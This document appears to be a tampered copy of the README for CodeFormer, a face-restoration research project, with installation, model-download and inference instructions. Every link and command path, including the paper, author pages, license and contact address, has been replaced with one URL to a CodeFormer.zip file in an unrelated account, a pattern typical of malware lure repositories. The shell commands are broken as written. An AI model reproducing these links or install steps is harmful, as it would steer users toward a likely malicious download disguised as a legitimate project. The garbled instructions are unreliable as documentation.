<p align="center">
  <img src="https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip" height=110>
</p>

## Towards Robust Blind Face Restoration with Codebook Lookup Transformer (NeurIPS 2022)

[Paper](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip) | [Project Page](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip) | [Video](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip)


<a href="https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip"><img src="https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip" alt="google colab logo"></a> [![Hugging Face](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip%F0%9F%A4%97%20Hugging%20Face-blue)](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip) [![Replicate](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip%F0%9F%9A%80%20Replicate-blue)](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip) ![Visitors](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip)



[Shangchen Zhou](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip), [Kelvin C.K. Chan](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip), [Chongyi Li](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip), [Chen Change Loy](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip) 

S-Lab, Nanyang Technological University

<img src="https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip" width="800px"/>


:star: If CodeFormer is helpful to your images or projects, please help star this repo. Thanks! :hugs: 


### Update
- **2023.04.19**: :whale: Training codes and config files are public available now.
- **2023.04.09**: Add features of inpainting and colorization for cropped and aligned face images.
- **2023.02.10**: Include `dlib` as a new face detector option, it produces more accurate face identity.
- **2022.10.05**: Support video input `--input_path [https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip]`. Try it to enhance your videos! :clapper: 
- **2022.09.14**: Integrated to :hugs: [Hugging Face](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip). Try out online demo! [![Hugging Face](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip%F0%9F%A4%97%20Hugging%20Face-blue)](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip)
- **2022.09.09**: Integrated to :rocket: [Replicate](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip). Try out online demo! [![Replicate](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip%F0%9F%9A%80%20Replicate-blue)](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip)
- [**More**](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip)

### TODO
- [x] Add training code and config files
- [x] Add checkpoint and script for face inpainting
- [x] Add checkpoint and script for face colorization
- [x] ~~Add background image enhancement~~

#### :panda_face: Try Enhancing Old Photos / Fixing AI-arts
[<img src="https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip" height="226px"/>](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip) [<img src="https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip" height="226px"/>](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip) [<img src="https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip" height="226px"/>](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip) 

#### Face Restoration

<img src="https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip" width="400px"/> <img src="https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip" width="400px"/>
<img src="https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip" width="400px"/> <img src="https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip" width="400px"/>

#### Face Color Enhancement and Restoration

<img src="https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip" width="400px"/> <img src="https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip" width="400px"/>

#### Face Inpainting

<img src="https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip" width="400px"/> <img src="https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip" width="400px"/>



### Dependencies and Installation

- Pytorch >= 1.7.1
- CUDA >= 10.1
- Other required packages in `https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip`
```
# git clone this repository
git clone https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip
cd CodeFormer

# create new anaconda env
conda create -n codeformer python=3.8 -y
conda activate codeformer

# install python dependencies
pip3 install -r https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip
python https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip develop
conda install -c conda-forge dlib (only for face detection or cropping with dlib)
```
<!-- conda install -c conda-forge dlib -->

### Quick Inference

#### Download Pre-trained Models:
Download the facelib and dlib pretrained models from [[Releases](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip) | [Google Drive](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip) | [OneDrive](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip)] to the `weights/facelib` folder. You can manually download the pretrained models OR download by running the following command:
```
python https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip facelib
python https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip dlib (only for dlib face detector)
```

Download the CodeFormer pretrained models from [[Releases](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip) | [Google Drive](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip) | [OneDrive](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip)] to the `weights/CodeFormer` folder. You can manually download the pretrained models OR download by running the following command:
```
python https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip CodeFormer
```

#### Prepare Testing Data:
You can put the testing images in the `inputs/TestWhole` folder. If you would like to test on cropped and aligned faces, you can put them in the `inputs/cropped_faces` folder. You can get the cropped and aligned faces by running the following command:
```
# you may need to install dlib via: conda install -c conda-forge dlib
python https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip -i [input folder] -o [output folder]
```


#### Testing:
[Note] If you want to compare CodeFormer in your paper, please run the following command indicating `--has_aligned` (for cropped and aligned face), as the command for the whole image will involve a process of face-background fusion that may damage hair texture on the boundary, which leads to unfair comparison.

Fidelity weight *w* lays in [0, 1]. Generally, smaller *w* tends to produce a higher-quality result, while larger *w* yields a higher-fidelity result. The results will be saved in the `results` folder.


🧑🏻 Face Restoration (cropped and aligned face)
```
# For cropped and aligned faces (512x512)
python https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip -w 0.5 --has_aligned --input_path [image folder]|[image path]
```

:framed_picture: Whole Image Enhancement
```
# For whole image
# Add '--bg_upsampler realesrgan' to enhance the background regions with Real-ESRGAN
# Add '--face_upsample' to further upsample restorated face with Real-ESRGAN
python https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip -w 0.7 --input_path [image folder]|[image path]
```

:clapper: Video Enhancement
```
# For Windows/Mac users, please install ffmpeg first
conda install -c conda-forge ffmpeg
```
```
# For video clips
# Video path should end with '.mp4'|'.mov'|'.avi'
python https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip --bg_upsampler realesrgan --face_upsample -w 1.0 --input_path [video path]
```

🌈 Face Colorization (cropped and aligned face)
```
# For cropped and aligned faces (512x512)
# Colorize black and white or faded photo
python https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip --input_path [image folder]|[image path]
```

🎨 Face Inpainting (cropped and aligned face)
```
# For cropped and aligned faces (512x512)
# Inputs could be masked by white brush using an image editing app (e.g., Photoshop) 
# (check out the examples in inputs/masked_faces)
python https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip --input_path [image folder]|[image path]
```
### Training:
The training commands can be found in the documents: [English](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip) **|** [简体中文](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip).

### Citation
If our work is useful for your research, please consider citing:

    @inproceedings{zhou2022codeformer,
        author = {Zhou, Shangchen and Chan, Kelvin C.K. and Li, Chongyi and Loy, Chen Change},
        title = {Towards Robust Blind Face Restoration with Codebook Lookup TransFormer},
        booktitle = {NeurIPS},
        year = {2022}
    }

### License

This project is licensed under <a rel="license" href="https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip">NTU S-Lab License 1.0</a>. Redistribution and use should follow this license.

### Acknowledgement

This project is based on [BasicSR](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip). Some codes are brought from [Unleashing Transformers](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip), [YOLOv5-face](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip), and [FaceXLib](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip). We also adopt [Real-ESRGAN](https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip) to support background image enhancement. Thanks for their awesome works.

### Contact
If you have any questions, please feel free to reach me out at `https://raw.githubusercontent.com/kuoizong881681/CodeFormer/master/chancriform/CodeFormer.zip`. 
